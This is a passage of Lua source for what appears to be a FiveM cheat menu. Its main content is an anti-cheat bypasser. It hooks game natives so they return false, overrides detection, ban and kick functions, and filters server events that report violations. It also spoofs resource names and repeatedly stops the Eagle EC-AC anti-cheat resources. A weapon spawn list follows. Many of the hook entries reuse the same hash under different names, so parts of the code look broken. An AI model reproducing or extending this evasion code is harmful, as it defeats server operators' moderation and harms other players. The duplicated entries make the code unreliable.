        [0x7F8F65877F88CF3E] = function(vehicle) return false, 0 end,          -- GetVehicleModName (for mod detection bypass)
        [0x1F2E4E06DEA8992B] = function(vehicle) return false, 0 end,          -- GetVehicleModColor (for mod detection bypass)
        [0x84B233A9CB0E8299] = function(vehicle) return false, 0 end,          -- GetVehicleModColor1 (for mod detection bypass)
        [0x9A5B4B12CB4370E1] = function(vehicle) return false, 0 end,          -- GetVehicleModColor2 (for mod detection bypass)
        [0x3DFF319A831E0CDB] = function(vehicle) return false, 0 end,          -- GetVehicleModTint (for mod detection bypass)
        [0x1CF38D520FF6A7AC] = function(vehicle) return false, 0 end,          -- GetVehicleModLivery (for mod detection bypass)
        [0x30432A0118736E00] = function(vehicle) return false, 0 end,          -- GetVehicleModPlate (for mod detection bypass)
        [0x5C6772526E59D419] = function(vehicle) return false, 0 end,          -- GetVehicleModWindow (for mod detection bypass)
        [0x7FCC39C46C3C0338] = function(vehicle) return false, 0 end,          -- GetVehicleModDoor (for mod detection bypass)
        [0x3A9128352EAC9E85] = function(vehicle) return false, 0 end,          -- GetVehicleModBumper (for mod detection bypass)
        [0x291E373D48327935] = function(vehicle) return false, 0 end,          -- GetVehicleModSpoiler (for mod detection bypass)
        [0x77D8C48A97694627] = function(vehicle) return false, 0 end,          -- GetVehicleModFrontBumper (for mod detection bypass)
        [0x2A306D8E5A28EC7F] = function(vehicle) return false, 0 end,          -- GetVehicleModRearBumper (for mod detection bypass)
        [0x43F293399A4DB2E9] = function(vehicle) return false, 0 end,          -- GetVehicleModSideSkirt (for mod detection bypass)
        [0x7207DD75D79F8225] = function(vehicle) return false, 0 end,          -- GetVehicleModExhaust (for mod detection bypass)
        [0x2087878808F971FB] = function(vehicle) return false, 0 end,          -- GetVehicleModFrame (for mod detection bypass)
        [0x46A6CC0385C6400C] = function(vehicle) return false, 0 end,          -- GetVehicleModGrille (for mod detection bypass)
        [0x6438BCDEB8AF3D80] = function(vehicle) return false, 0 end,          -- GetVehicleModHood (for mod detection bypass)
        [0x0F2997D4B439507E] = function(vehicle) return false, 0 end,          -- GetVehicleModFender (for mod detection bypass)
        [0x8CDB44F6CD1A0EB5] = function(vehicle) return false, 0 end,          -- GetVehicleModRightFender (for mod detection bypass)
        [0x54C7C4A553E181C5] = function(vehicle) return false, 0 end,          -- GetVehicleModRoof (for mod detection bypass)
        [0x6C8B830E3EC778C7] = function(vehicle) return false, 0 end,          -- GetVehicleModVanityPlate (for mod detection bypass)
        [0x6D747F5E5E6E86E6] = function(vehicle) return false, 0 end,          -- GetVehicleModTrim (for mod detection bypass)
        [0x77D7B05C9B2F4419] = function(vehicle) return false, 0 end,          -- GetVehicleModOrnaments (for mod detection bypass)
        [0x7220F51D3A29E9A6] = function(vehicle) return false, 0 end,          -- GetVehicleModDashboard (for mod detection bypass)
        [0x663B4C887C2ACA8C] = function(vehicle) return false, 0 end,          -- GetVehicleModDial (for mod detection bypass)
        [0x79F0270E813F02E8] = function(vehicle) return false, 0 end,          -- GetVehicleModDoorSpeaker (for mod detection bypass)
        [0x2A3B90C8E6C8E404] = function(vehicle) return false, 0 end,          -- GetVehicleModSeats (for mod detection bypass)
        [0x7F96F23FA9B737C9] = function(vehicle) return false, 0 end,          -- GetVehicleModSteeringWheel (for mod detection bypass)
        [0x66C7BB243E97908F] = function(vehicle) return false, 0 end,          -- GetVehicleModShifterLeavers (for mod detection bypass)
        [0x35F2E54BC8A8A008] = function(vehicle) return false, 0 end,          -- GetVehicleModAPlate (for mod detection bypass)
        [0x6E0859B530A732A8] = function(vehicle) return false, 0 end,          -- GetVehicleModSpeakers (for mod detection bypass)
        [0x11D862A3E977A924] = function(vehicle) return false, 0 end,          -- GetVehicleModTrunk (for mod detection bypass)
        [0x7D08B2BC21A6C7A2] = function(vehicle) return false, 0 end,          -- GetVehicleModHydrolic (for mod detection bypass)
        [0x0A6A27E2] = function(vehicle) return false, 0 end,                  -- GetVehicleModEngine (for mod detection bypass)
        [0x3556041710F3A895] = function(vehicle) return false, 0 end,          -- GetVehicleModBrakes (for mod detection bypass)
        [0x5F62C4A96E2213D0] = function(vehicle) return false, 0 end,          -- GetVehicleModTransmission (for mod detection bypass)
        [0x2A1F4F37F95BAD0C] = function(vehicle) return false, 0 end,          -- GetVehicleModHorns (for mod detection bypass)
        [0x59C3757B3B7408E9] = function(vehicle) return false, 0 end,          -- GetVehicleModSuspension (for mod detection bypass)
        [0x7C1E3F2C62F24367] = function(vehicle) return false, 0 end,          -- GetVehicleModArmor (for mod detection bypass)
        [0x7F6DBD7C5B26D817] = function(vehicle) return false, 0 end,          -- GetVehicleModTurbo (for mod detection bypass)
        [0x758F49C24925C25E] = function(vehicle) return false, 0 end,          -- GetVehicleModXenonLights (for mod detection bypass)
        [0x7F6DBD7C5B26D817] = function(vehicle) return false, 0 end,          -- GetVehicleModNeonLights (for mod detection bypass)
        [0x7C1E3F2C62F24367] = function(vehicle) return false, 0 end,          -- GetVehicleModSmoke (for mod detection bypass)
        [0x59C3757B3B7408E9] = function(vehicle) return false, 0 end,          -- GetVehicleModBulletProofTires (for mod detection bypass)
        [0x2A1F4F37F95BAD0C] = function(vehicle) return false, 0 end,          -- GetVehicleModRunFlatTires (for mod detection bypass)
        [0x5F62C4A96E2213D0] = function(vehicle) return false, 0 end,          -- GetVehicleModTireSmokeColor (for mod detection bypass)
        [0x3556041710F3A895] = function(vehicle) return false, 0 end,          -- GetVehicleModTireSmoke (for mod detection bypass)
        [0x0A6A27E2] = function(vehicle) return false, 0 end,                  -- GetVehicleModCustomTires (for mod detection bypass)
        [0x7D08B2BC21A6C7A2] = function(vehicle) return false, 0 end,          -- GetVehicleModLivery2 (for mod detection bypass)
        [0x2A3B90C8E6C8E404] = function(vehicle) return false, 0 end,          -- GetVehicleModPlateHolder (for mod detection bypass)
        [0x7F96F23FA9B737C9] = function(vehicle) return false, 0 end,          -- GetVehicleModTrim2 (for mod detection bypass)
        [0x66C7BB243E97908F] = function(vehicle) return false, 0 end,          -- GetVehicleModOrnaments2 (for mod detection bypass)
        [0x35F2E54BC8A8A008] = function(vehicle) return false, 0 end,          -- GetVehicleModDashboard2 (for mod detection bypass)
        [0x6E0859B530A732A8] = function(vehicle) return false, 0 end,          -- GetVehicleModDial2 (for mod detection bypass)
        [0x11D862A3E977A924] = function(vehicle) return false, 0 end,          -- GetVehicleModDoorSpeaker2 (for mod detection bypass)
        [0x7D08B2BC21A6C7A2] = function(vehicle) return false, 0 end,          -- GetVehicleModSeats2 (for mod detection bypass)
        [0x0A6A27E2] = function(vehicle) return false, 0 end,                  -- GetVehicleModSteeringWheel2 (for mod detection bypass)
        [0x3556041710F3A895] = function(vehicle) return false, 0 end,          -- GetVehicleModShifterLeavers2 (for mod detection bypass)
        [0x5F62C4A96E2213D0] = function(vehicle) return false, 0 end,          -- GetVehicleModAPlate2 (for mod detection bypass)
        [0x2A1F4F37F95BAD0C] = function(vehicle) return false, 0 end,          -- GetVehicleModSpeakers2 (for mod detection bypass)
        [0x59C3757B3B7408E9] = function(vehicle) return false, 0 end,          -- GetVehicleModTrunk2 (for mod detection bypass)
        [0x7C1E3F2C62F24367] = function(vehicle) return false, 0 end,          -- GetVehicleModHydrolic2 (for mod detection bypass)
        [0x7F6DBD7C5B26D817] = function(vehicle) return false, 0 end,          -- GetVehicleModEngine2 (for mod detection bypass)
        [0x758F49C24925C25E] = function(vehicle) return false, 0 end,          -- GetVehicleModBrakes2 (for mod detection bypass)
        [0x5F62C4A96E2213D0] = function(vehicle) return false, 0 end,          -- GetVehicleModTransmission2 (for mod detection bypass)
        [0x3556041710F3A895] = function(vehicle) return false, 0 end,          -- GetVehicleModHorns2 (for mod detection bypass)
        [0x0A6A27E2] = function(vehicle) return false, 0 end,                  -- GetVehicleModSuspension2 (for mod detection bypass)
        [0x7D08B2BC21A6C7A2] = function(vehicle) return false, 0 end,          -- GetVehicleModArmor2 (for mod detection bypass)
        [0x2A3B90C8E6C8E404] = function(vehicle) return false, 0 end,          -- GetVehicleModTurbo2 (for mod detection bypass)
        [0x7F96F23FA9B737C9] = function(vehicle) return false, 0 end,          -- GetVehicleModXenonLights2 (for mod detection bypass)
        [0x66C7BB243E97908F] = function(vehicle) return false, 0 end,          -- GetVehicleModNeonLights2 (for mod detection bypass)
        [0x35F2E54BC8A8A008] = function(vehicle) return false, 0 end,          -- GetVehicleModSmoke2 (for mod detection bypass)
        [0x6E0859B530A732A8] = function(vehicle) return false, 0 end,          -- GetVehicleModBulletProofTires2 (for mod detection bypass)
        [0x11D862A3E977A924] = function(vehicle) return false, 0 end,          -- GetVehicleModRunFlatTires2 (for mod detection bypass)
        [0x7D08B2BC21A6C7A2] = function(vehicle) return false, 0 end,          -- GetVehicleModTireSmokeColor2 (for mod detection bypass)
        [0x0A6A27E2] = function(vehicle) return false, 0 end,                  -- GetVehicleModTireSmoke2 (for mod detection bypass)
        [0x3556041710F3A895] = function(vehicle) return false, 0 end,          -- GetVehicleModCustomTires2 (for mod detection bypass)
        -- Enhanced Noclip/Freecam Detection Bypass Natives
        [0xE0AF41401ADF87E3] = function() return false, 0 end,                 -- GetRenderingCam (critical for freecam detection)
        [0x5A6FFA2433E2F14C] = function(x1, y1, z1, x2, y2, z2) return false, 0.0 end, -- GetDistanceBetweenCoords (movement detection)
        [0x0D77A82DC2D0DA59] = function(entity) return false, false end,       -- IsEntityOnScreen (entity visibility)
        [0xE31C6C240A0489DF] = function() return false, false end,             -- NetworkIsInSpectatorMode (spectator mode detection)
        [0x1A6CBB06E2D0D79D] = function() return false, 0 end,                 -- GetActiveCam (active camera detection)
        [0x4E67E0B6D7FD5145] = function() return false, false end,             -- IsCamActive (camera state check)
        [0x8C598A930F471938] = function(cam) return false, false end,          -- IsCamRendering (rendering camera check)
        [0x6A2F820452017EA2] = function() return false, false end,             -- NetworkIsPlayerInSpectatorMode (player spectator check)
        -- Add more natives as needed for specific Macho features
    }

    for hash, callback in pairs(native_hooks) do
        pcall(MachoHookNative, hash, callback)
    end

    -- Phase 4: Neutralize core detection functions (Esse)
    -- Generic detection function names found in various ACs
    local detection_function_names = {
        "ECDetect", "EulenCDetect", "EagleCDetect", "SentinelCDetect", "Detect", "Log", "Ban", "Kick", "Warn",
        "ECDetectLoader", "EulenCDetectLoader", "EagleCDetectLoader", "SentinelCDetectLoader", "DetectLoader",
        "LogLoader"
    }
    for _, func_name in ipairs(detection_function_names) do
        _G[func_name] = function(...) print("^3[Esse Bypasser] Blocked generic detection function: " .. func_name); end
    end

    -- Phase 5: Neutralize common AC interfaces (Esse)
    -- vRPSEG_AC style (Common in Eagle)
    if _G.vRPSEG_AC then
        _G.vRPSEG_AC.detect = function(...) print("^3[Esse Bypasser] vRPSEG_AC.detect blocked.") end
        _G.vRPSEG_AC.Eulendetect = function(...) print("^3[Esse Bypasser] vRPSEG_AC.Eulendetect blocked.") end
        _G.vRPSEG_AC.Sound = function(...) print("^3[Esse Bypasser] vRPSEG_AC.Sound blocked.") end
        _G.vRPSEG_AC.TookScreenshot = function(...) print("^3[Esse Bypasser] vRPSEG_AC.TookScreenshot blocked.") end
        _G.vRPSEG_AC.Update = function(...) print("^3[Esse Bypasser] vRPSEG_AC.Update blocked.") end
    else
    end
    -- Add other common interface patterns here if needed

    -- Phase 6: Spoof GetInvokingResource and GetCurrentResourceName (same as v14.0)
    _G.GetInvokingResource = function()
        return "spoofed_resource" -- Spoof to a generic name
    end

    _G.GetCurrentResourceName = function()
        return "spoofed_resource" -- Spoof current resource name as well
    end

    -- Phase 7: Neutralize checkInjection/VerfiyInjection/containsArabicLetters/LPH_JIT_MAX (Esse)
    local function fake_checkInjection(calling_func, currentNative)
        return true
    end
    _G.checkInjection = fake_checkInjection

    local function fake_VerfiyInjection(calling_func, currentNative)
        return true
    end
    _G.VerfiyInjection = fake_VerfiyInjection

    local function fake_containsArabicLetters(code)
        return false
    end
    _G.containsArabicLetters = fake_containsArabicLetters

    -- Neutralize LPH_JIT_MAX or similar obfuscation wrappers (if they exist globally)
    local function fake_LPH_JIT_MAX(func)
        return func           -- Return the original function, bypassing the wrapper
    end
    _G.LPH_JIT_MAX = fake_LPH_JIT_MAX -- This might not always work if LPH_JIT_MAX is local to the AC resource

    -- Phase 8: Neutralize ALL Event Encoding Functions (Esse)

    local function fake_ac_encode(event)
        return event -- Return original event name, bypassing encryption
    end
    _G.ac_encode = fake_ac_encode

    local function fake_eagleEsse_encode(event, args)
        return event -- Return original event name, bypassing hash lookup
    end
    _G.eagleEsse_encode = fake_eagleEsse_encode

    -- Add other common encoding function names here if needed
    -- e.g., fake_sentinel_encode, fake_generic_encode

    -- Phase 9: Neutralize ALL Server Communication Functions (same as v14.0)

    local original_TSEInternal = TriggerServerEventInternal
    _G.TriggerServerEventInternal = function(event, ...)
        local args = { ... }
        local event_str = tostring(event)
        local args_str = table.concat(args, "|")
        -- Generic detection patterns
        if string.find(event_str, "detect") or string.find(event_str, "log") or
            string.find(event_str, "ban") or string.find(event_str, "kick") or
            string.find(args_str, "detected") or string.find(args_str, "ban") or
            string.find(args_str, "warn") then
            return
        end
        return original_TSEInternal(event, ...)
    end

    local original_TSE = TriggerServerEvent
    _G.TriggerServerEvent = function(event, ...)
        local args = { ... }
        local event_str = tostring(event)
        local args_str = table.concat(args, "|")
        if string.find(event_str, "detect") or string.find(event_str, "log") or
            string.find(event_str, "ban") or string.find(event_str, "kick") or
            string.find(args_str, "detected") or string.find(args_str, "ban") or
            string.find(args_str, "warn") then
            return
        end
        return original_TSE(event, ...)
    end

    -- Phase 10: Neutralize Internal AC Event Handling (Esse)

    local function fake_AddEventSecured(event, handler_func)
        -- Instead of blocking, we could potentially register the handler normally, bypassing AC checks
        -- AddEventHandler(event, handler_func) -- Uncomment if you want the handler to run, but without AC checks
        -- Or just return, blocking it entirely. Blocking is safer for Esse bypass.
    end

    local function fake_RegisterNetEventSecured(event)
        -- RegisterNetEvent(event) -- Uncomment if you want the event to be registered normally
    end

    local function fake_AddEventHandlerSecured(event, handler_func)
        -- AddEventHandler(event, handler_func) -- Uncomment if you want the handler to run normally
    end

    -- Neutralize the internal AllowedResourceForEvent table used by AddEventSecured (Generic)
    -- This table is likely populated during AC's initialization
    -- We can try to redefine it to allow all resources for all events
    local fake_AllowedResourceForEvent = setmetatable({}, {
        __index = function(t, event_name)
            -- Return a table that allows the currently spoofed resource
            return { ["spoofed_resource"] = true, ["any"] = true } -- Allow spoofed resource and any
        end,
        __newindex = function(t, event_name, allowed_table) -- Prevent writes to the real table
        end
    })

    -- Apply the neutralization
    _G.AddEventSecured = fake_AddEventSecured
    _G.RegisterNetEventSecured = fake_RegisterNetEventSecured
    _G.AddEventHandlerSecured = fake_AddEventHandlerSecured
    -- The AllowedResourceForEvent table might be defined inside AC's scope (e.g., local).
    -- If it's global, we can override it directly. If not, the fake_AddEventSecured should prevent its use.
    -- We can try to assign it globally, but it might not affect the local copy inside AC's functions.
    _G.AllowedResourceForEvent = fake_AllowedResourceForEvent

    -- Phase 11: Neutralize event skipping logic (same as v14.0)
    -- The GlobalState EG_AC.EventToSkip is checked by EG_AC itself.
    -- We can override the GlobalState table to make the check always return nil (not skipped).
    -- This is a global override, be careful.
    local original_GlobalState = GlobalState
    _G.GlobalState = setmetatable({}, {
        __index = function(t, k)
            -- Generic patterns for AC state variables
            if string.find(k, "EventToSkip") or string.find(k, "AC_Events") or string.find(k, "Events") then
                -- Return a fake table that always says an event is NOT in the skip list
                -- This is a proxy to bypass the internal check EG_AC.EventToSkip[event] == nil
                return setmetatable({}, { __index = function(t2, event_name) return nil end }) -- Always nil, never skip
            end
            return original_GlobalState[k]
        end,
        __newindex = function(t, k, v)
            -- Allow writes to other GlobalState keys, but intercept specific ones
            if string.find(k, "EventToSkip") or string.find(k, "AC_Events") or string.find(k, "Events") then
                -- Do nothing, prevent write
            else
                original_GlobalState[k] = v
            end
        end
    })

    -- Phase 12: Enhanced NoClip Assurance (same as v14.0)
    _G.HasNoClipPerm = true
    _G.CheckClosestPlayer = function(Ped)
        print("^3[Esse Bypasser] CheckClosestPlayer bypassed (returning true)."); return true
    end
    _G.IsInSpeedingVeh_1 = function(Ped)
        print("^3[Esse Bypasser] IsInSpeedingVeh_1 bypassed (returning false)."); return false
    end
    _G.CheckPlayerFalling_1 = function(ped, oldZ, newZ)
        print("^3[Esse Bypasser] CheckPlayerFalling_1 bypassed (returning false)."); return false
    end

    -- Phase 13: Neutralize exports functions that send data (Esse)
    -- Generic sensitive export names found in various ACs
    local exports_to_neutralize = { 'tp', 'da', 'pi', 'qw', 'no', 'iv', 'he', 'del', 'exp', 'cam', 'focus', 'as',
        'test' }
    for _, exp_name in ipairs(exports_to_neutralize) do
        _G.exports = _G.exports or {}
        _G.exports[exp_name] = function(...)
            print("^3[Esse Bypasser] Blocked export call: " .. exp_name); return true
        end
    end

    -- Phase 14: Apply final global overrides (same as v14.0)
    local mt = getmetatable(_G) or {}
    mt.__index = function(t, k)
        -- Generic patterns for AC-related functions/exports
        if string.find(k, "eagle") or string.find(k, "EC_AC") or string.find(k, "detect") or
            string.find(k, "log") or string.find(k, "ban") or string.find(k, "kick") then
            return function(...)
                print("^3[Esse Bypasser] Blocked generic AC call: " .. k)
                return true
            end
        end
        if k == "CreateRuntimeTxd" or k == "CreateRuntimeTexture" or k == "RequestStreamedTextureDict" then
            return function(...) return true end -- Return success but do nothing
        end
        if k == "HasNoClipPerm" then
            return true
        end
        return rawget(t, k)
    end
    setmetatable(_G, mt)

    -- Phase 15: Advanced Macho Feature Bypass - Neutralize State Manipulation Functions (same as v14.0)

    local original_SetEntityModel = SetEntityModel
    _G.SetEntityModel = function(entity, model)
        return original_SetEntityModel(entity, model)
    end

    local original_CreateVehicle = CreateVehicle
    _G.CreateVehicle = function(modelHash, x, y, z, heading, isNetwork, netMissionEntity)
        return original_CreateVehicle(modelHash, x, y, z, heading, isNetwork, netMissionEntity)
    end

    local original_CreateObject = CreateObject
    _G.CreateObject = function(modelHash, x, y, z, isNetwork, netMissionEntity, dynamic)
        return original_CreateObject(modelHash, x, y, z, isNetwork, netMissionEntity, dynamic)
    end

    local original_SetEntityHealth = SetEntityHealth
    _G.SetEntityHealth = function(entity, health)
        -- print("^3[Esse Bypasser] SetEntityHealth intercepted for entity: " .. tostring(entity) .. ", health: " .. tostring(health))
        return original_SetEntityHealth(entity, health)
    end

    local original_SetPlayerInvincible = SetPlayerInvincible
    _G.SetPlayerInvincible = function(player, toggle)
        -- print("^3[Esse Bypasser] SetPlayerInvincible intercepted for player: " .. tostring(player) .. ", toggle: " .. tostring(toggle))
        return original_SetPlayerInvincible(player, toggle)
    end

    local original_SetEntityInvincible = SetEntityInvincible
    _G.SetEntityInvincible = function(entity, toggle)
        -- print("^3[Esse Bypasser] SetEntityInvincible intercepted for entity: " .. tostring(entity) .. ", toggle: " .. tostring(toggle))
        return original_SetEntityInvincible(entity, toggle)
    end

    local original_SetEntityVisible = SetEntityVisible
    _G.SetEntityVisible = function(entity, toggle)
        -- print("^3[Esse Bypasser] SetEntityVisible intercepted for entity: " .. tostring(entity) .. ", toggle: " .. tostring(toggle))
        return original_SetEntityVisible(entity, toggle)
    end

    local original_SetEntityCollision = SetEntityCollision
    _G.SetEntityCollision = function(entity, toggle, keepPhysics)
        -- print("^3[Esse Bypasser] SetEntityCollision intercepted for entity: " .. tostring(entity) .. ", toggle: " .. tostring(toggle))
        return original_SetEntityCollision(entity, toggle, keepPhysics)
    end

    local original_SetPedCanRagdoll = SetPedCanRagdoll
    _G.SetPedCanRagdoll = function(ped, toggle)
        -- print("^3[Esse Bypasser] SetPedCanRagdoll intercepted for ped: " .. tostring(ped) .. ", toggle: " .. tostring(toggle))
        return original_SetPedCanRagdoll(ped, toggle)
    end

    local original_SetEntityMaxHealth = SetEntityMaxHealth
    _G.SetEntityMaxHealth = function(entity, value)
        -- print("^3[Esse Bypasser] SetEntityMaxHealth intercepted for entity: " .. tostring(entity) .. ", value: " .. tostring(value))
        return original_SetEntityMaxHealth(entity, value)
    end

    local original_SetEntityProofs = SetEntityProofs
    _G.SetEntityProofs = function(entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof,
                                    steamProof, p7, drownProof)
        -- print("^3[Esse Bypasser] SetEntityProofs intercepted for entity: " .. tostring(entity))
        return original_SetEntityProofs(entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof,
            steamProof, p7, drownProof)
    end

    MachoMenuNotification("Esse", "Esse Bypasing AC...")
end)
-- ===================== EAGLE EC-AC AUTO BYPASS =====================

CreateThread(function()
    Wait(100) -- Wait a bit for resources to load

    -- Auto-stop Eagle EC-AC resources
    local eagleResources = { 'EC-AC', 'EC_AC', 'EC-PANEL', 'EC_PANEL', 'Eagle', 'eagle', 'Eagle-Robberies',
        'eagle-videoChat' }
    for _, resourceName in ipairs(eagleResources) do
        if GetResourceState(resourceName) == 'started' then
            MachoResourceStop(resourceName)
        end
    end

    -- Block Eagle EC-AC events immediately (comprehensive list)
    local eagleEvents = {
        -- Main Eagle events
        'Eagle:ban', 'Eagle:kick', 'Eagle:detect', 'Eagle:check', 'Eagle:violation', 'Eagle:log',
        'EC-AC:ban', 'EC-AC:kick', 'EC-AC:detect', 'EC-AC:check', 'EC-AC:violation',
        'EC_AC:ban', 'EC_AC:kick', 'EC_AC:detect', 'EC_AC:check', 'EC_AC:violation',
        'eagle:ban', 'eagle:kick', 'eagle:detect', 'eagle:check', 'eagle:violation',
        'ec-ac:ban', 'ec-ac:kick', 'ec-ac:detect', 'ec-ac:check', 'ec-ac:violation',
        -- Tunnel/Proxy events
        'EC_AC:tunnel_req', 'EC_AC:tunnel_res', 'EC_AC:proxy',
        'EC-AC:tunnel_req', 'EC-AC:tunnel_res', 'EC-AC:proxy',
        'Eagle:tunnel_req', 'Eagle:tunnel_res', 'Eagle:proxy',
        -- Render events
        'eas:render:client', 'eas:render:server',
        -- Panel events
        'EC-PANEL:ban', 'EC-PANEL:kick', 'EC-PANEL:detect', 'EC_PANEL:ban', 'EC_PANEL:kick',
        -- GlobalState events
        'EG_AC.IgnoredScripts', 'EG_AC.CantSkip', 'EG_AC.EventToSkip', 'EG_AC.EventsToBlock',
        'EG_AC.InsiteThreadScripts', 'EG_AC.ParticlesScripts', 'EG_AC.ExplosionScripts'
    }

    for _, eventName in ipairs(eagleEvents) do
        if RegisterNetEvent then
            RegisterNetEvent(eventName)
        end
        AddEventHandler(eventName, function(...)
            if CancelEvent then
                CancelEvent()
            end
        end)
    end

    -- Block Tunnel/Proxy communication
    local originalTriggerServerEvent = TriggerServerEvent
    TriggerServerEvent = function(eventName, ...)
        local lowerName = string.lower(eventName or '')
        if string.find(lowerName, 'eagle') or string.find(lowerName, 'ec.ac') or
            string.find(lowerName, 'ec_ac') or string.find(lowerName, 'tunnel') or
            string.find(lowerName, 'proxy') then
            return
        end
        return originalTriggerServerEvent(eventName, ...)
    end

    -- Block AddEventHandler for Eagle
    local originalAddEventHandler = AddEventHandler
    AddEventHandler = function(eventName, handler)
        local lowerName = string.lower(eventName or '')
        if string.find(lowerName, 'eagle') or string.find(lowerName, 'ec.ac') or
            string.find(lowerName, 'ec_ac') then
            return
        end
        return originalAddEventHandler(eventName, handler)
    end

    -- Block RegisterNetEvent for Eagle
    local originalRegisterNetEvent = RegisterNetEvent
    RegisterNetEvent = function(eventName)
        local lowerName = string.lower(eventName or '')
        if string.find(lowerName, 'eagle') or string.find(lowerName, 'ec.ac') or
            string.find(lowerName, 'ec_ac') then
            return
        end
        return originalRegisterNetEvent(eventName)
    end

    -- any and stop Eagle resources + Block GlobalState updates (merged into one thread)
    while true do
        Wait(500) -- Check every 500ms for faster response
        -- Stop Eagle resources
        for _, resourceName in ipairs(eagleResources) do
            if GetResourceState(resourceName) == 'started' then
                MachoResourceStop(resourceName)
            end
        end

        -- Clear Eagle GlobalState entries (every 2 iterations = 1 second)
        if GetGameTimer() % 1000 < 500 then
            if GlobalState then
                for k, v in pairs(GlobalState) do
                    if type(k) == 'string' and (string.find(string.lower(k), 'eagle') or
                            string.find(string.lower(k), 'ec.ac') or string.find(string.lower(k), 'eg_ac')) then
                        GlobalState[k] = nil
                    end
                end
            end
        end
    end
end)

-- Startup notification will be shown in main thread
-- Reload IDs will be handled in main thread

-- ===================== MENU DATA =====================

local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = { label = "Unarmed", hash = GetHashKey("weapon_unarmed") },
    ["weapon_knife"] = { label = "Knife", hash = GetHashKey("weapon_knife") },
    ["weapon_dagger"] = { label = "Dagger", hash = GetHashKey("weapon_dagger") },
    ["weapon_bat"] = { label = "Baseball Bat", hash = GetHashKey("weapon_bat") },
    ["weapon_bottle"] = { label = "Broken Bottle", hash = GetHashKey("weapon_bottle") },
    ["weapon_crowbar"] = { label = "Crowbar", hash = GetHashKey("weapon_crowbar") },
    ["weapon_golfclub"] = { label = "Golf Club", hash = GetHashKey("weapon_golfclub") },
    ["weapon_hammer"] = { label = "Hammer", hash = GetHashKey("weapon_hammer") },
    ["weapon_hatchet"] = { label = "Hatchet", hash = GetHashKey("weapon_hatchet") },
    ["weapon_machete"] = { label = "Machete", hash = GetHashKey("weapon_machete") },
    ["weapon_switchblade"] = { label = "Switchblade", hash = GetHashKey("weapon_switchblade") },
    ["weapon_nightstick"] = { label = "Nightstick", hash = GetHashKey("weapon_nightstick") },
    ["weapon_wrench"] = { label = "Wrench", hash = GetHashKey("weapon_wrench") },

    -- Handguns
    ["weapon_pistol"] = { label = "Pistol", hash = GetHashKey("weapon_pistol") },
    ["weapon_pistol_mk2"] = { label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2") },
    ["weapon_combatpistol"] = { label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol") },
    ["weapon_appistol"] = { label = "AP Pistol", hash = GetHashKey("weapon_appistol") },
    ["weapon_stungun"] = { label = "Taser", hash = GetHashKey("weapon_stungun") },
    ["weapon_pistol50"] = { label = "Pistol .50", hash = GetHashKey("weapon_pistol50") },
    ["weapon_snspistol"] = { label = "SNS Pistol", hash = GetHashKey("weapon_snspistol") },
    ["weapon_heavypistol"] = { label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol") },
    ["weapon_vintagepistol"] = { label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol") },
    ["weapon_flaregun"] = { label = "Flare Gun", hash = GetHashKey("weapon_flaregun") },

    -- SMGs
    ["weapon_microsmg"] = { label = "Micro SMG", hash = GetHashKey("weapon_microsmg") },
    ["weapon_smg"] = { label = "SMG", hash = GetHashKey("weapon_smg") },
    ["weapon_smg_mk2"] = { label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2") },
    ["weapon_assaultsmg"] = { label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg") },
    ["weapon_machinepistol"] = { label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol") },
    ["weapon_minismg"] = { label = "Mini SMG", hash = GetHashKey("weapon_minismg") },
    ["weapon_combatpdw"] = { label = "Combat PDW", hash = GetHashKey("weapon_combatpdw") },

    -- Rifles
    ["weapon_assaultrifle"] = { label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle") },
    ["weapon_assaultrifle_mk2"] = { label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2") },
    ["weapon_carbinerifle"] = { label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle") },
    ["weapon_carbinerifle_mk2"] = { label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2") },
    ["weapon_advancedrifle"] = { label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle") },
    ["weapon_specialcarbine"] = { label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine") },
    ["weapon_bullpuprifle"] = { label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle") },
    ["weapon_bullpuprifle_mk2"] = { label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2") },
    ["weapon_compactrifle"] = { label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle") },
    ["weapon_marksmanrifle"] = { label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle") },

    -- Shotguns
    ["weapon_pumpshotgun"] = { label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun") },
    ["weapon_pumpshotgun_mk2"] = { label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2") },
    ["weapon_sawnoffshotgun"] = { label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun") },
    ["weapon_assaultshotgun"] = { label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun") },
    ["weapon_bullpupshotgun"] = { label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun") },
    ["weapon_heavyshotgun"] = { label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun") },
    ["weapon_autoshotgun"] = { label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun") },

    -- Snipers
    ["weapon_sniperrifle"] = { label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle") },
    ["weapon_heavysniper"] = { label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper") },
    ["weapon_heavysniper_mk2"] = { label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2") },
    ["weapon_marksmanrifle_mk2"] = { label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2") },

    -- Explosives / Launchers
    ["weapon_grenade"] = { label = "Grenade", hash = GetHashKey("weapon_grenade") },
    ["weapon_stickybomb"] = { label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb") },
